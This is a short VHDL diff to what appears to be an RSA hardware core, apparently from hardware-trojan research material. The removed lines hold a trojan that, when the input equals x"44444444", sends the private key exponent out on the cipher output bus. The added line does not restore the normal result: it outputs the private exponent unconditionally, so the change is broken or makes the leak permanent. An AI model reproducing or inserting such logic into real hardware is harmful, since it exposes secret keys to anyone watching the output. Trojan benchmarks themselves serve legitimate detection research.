@@ -167,11 +167,7 @@ begin
 -- after first time
 			elsif count = 0 then
 				if bothrdy = '1' and multgo = '0' then
-					if indata = x"44444444" then
-						cypher <= inExp;		-- Trojan leaks the private key exponet through cypher output bus
-					else
-						cypher <= tempout;		-- set output value
-					end if;		
+					cypher <= inExp;
 					done <= '1';
 				end if;
 			elsif bothrdy = '1' then
